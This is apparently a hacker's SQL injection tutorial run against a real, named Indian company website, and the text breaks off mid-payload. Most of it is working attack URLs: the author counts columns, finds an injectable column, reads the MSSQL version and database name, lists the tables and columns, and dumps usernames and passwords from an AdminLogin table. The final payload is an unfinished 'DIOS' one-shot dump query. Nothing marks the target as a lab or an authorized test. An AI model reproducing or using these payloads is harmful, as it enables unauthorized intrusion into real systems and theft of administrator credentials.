http://aquaservices.co.in/Product.aspx?Id=13--
working fine.
http://aquaservices.co.in/Product.aspx?Id=13 order by 1--
No Error
http://aquaservices.co.in/Product.aspx?Id=13 order by 100--
Here comes the error : The order by position number 100 is out of range of the number of items


http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union Select 1,2,3,4,5,6,7,8--
Again we got a error : Operand Type Clash: text is incompatible with int


http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union Select null,null,null,null,null,null,null,null--
Again we got a error : The text data type cannot be selected as DISTINCT because it is not comparable.


http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select null,null,null,null,null,null,null,null--
Again we got a error : Conversion from type 'DBNull' to type 'String' is not valid. Also known as Datatype Mistmatch Error


Now we can Put @@version on place of vulnerable column to get the current version from database.
http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,@@version,3,4,5,6,db_name(),8--


And we got the version, now we can get the current database name using db_name().
http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,db_name(),3,4,5,6,db_name(),8--


http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,table_name,3,4,5,6,db_name(),8 from (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc--
We got the first table name : AdminLogin
http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,table_name,3,4,5,6,db_name(),8 from (select top 2 table_name from information_schema.tables order by 1) as shit order by 1 desc--
We got the second table name : Certificate
http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,table_name,3,4,5,6,db_name(),8 from (select top 3 table_name from information_schema.tables order by 1) as shit order by 1 desc--
We got the Forth table name : ClientList


http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,column_name,3,4,5,6,db_name(),8 from (select top 1 column_name from information_schema.columns where table_name='AdminLogin' order by 1) as shit order by 1 desc--
We got the first column from AdminLogin Table : IsActive
http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,column_name,3,4,5,6,db_name(),8 from (select top 2 column_name from information_schema.columns where table_name='AdminLogin' order by 1) as shit order by 1 desc--
We got the Second column from AdminLogin Table : Password
http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,column_name,3,4,5,6,db_name(),8 from (select top 4 column_name from information_schema.columns where table_name='AdminLogin' order by 1) as shit order by 1 desc--
We got the Third column from AdminLogin Table : UserName



We got the table names the column names and now lets extrct the data from them. For concatination we can use %2b which is +.
http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,username%2b' '%2bpassword,3,4,5,6,db_name(),8 from AdminLogin--


Now in the end i will like to show you how to make the whole process alot faster by using MSSQL DIOS
http://aquaservices.co.in/Product.aspx?Id=13;begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by ZEN ::
